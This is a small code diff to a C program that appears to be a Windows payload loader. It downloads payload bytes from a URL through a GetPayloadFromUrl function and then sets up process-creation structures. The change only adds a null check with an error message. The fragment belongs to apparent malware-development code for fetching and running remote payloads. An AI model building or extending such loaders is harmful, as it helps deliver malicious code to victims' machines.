@@ -133,7 +133,9 @@ int main() {
 
     GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize);
 
-	
+	if (pPayloadBytes == NULL || sPayloadSize == NULL) {
+		printf("[!] Something Failed \n");
+	}
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
 
